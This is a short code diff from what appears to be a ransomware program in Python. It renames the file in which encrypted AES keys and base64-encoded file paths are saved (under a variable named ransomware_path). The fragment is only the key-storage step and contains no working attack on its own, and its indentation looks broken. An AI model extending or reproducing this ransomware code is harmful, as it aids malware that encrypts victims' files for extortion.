@@ -141,7 +141,7 @@ def menu():
     gc.collect()
 
     # save to disk -> ENC(AES) BASE64(PATH)
-    with open(ransomware_path + "aes_keys_and_paths", 'w') as f:
+    with open(ransomware_path + "AES_encrypted_keys", 'w') as f:
     for _ in enc_aes_key_and_base64_path:
         line = _[0] + " " + _[1] + "\n"
         f.write(line)
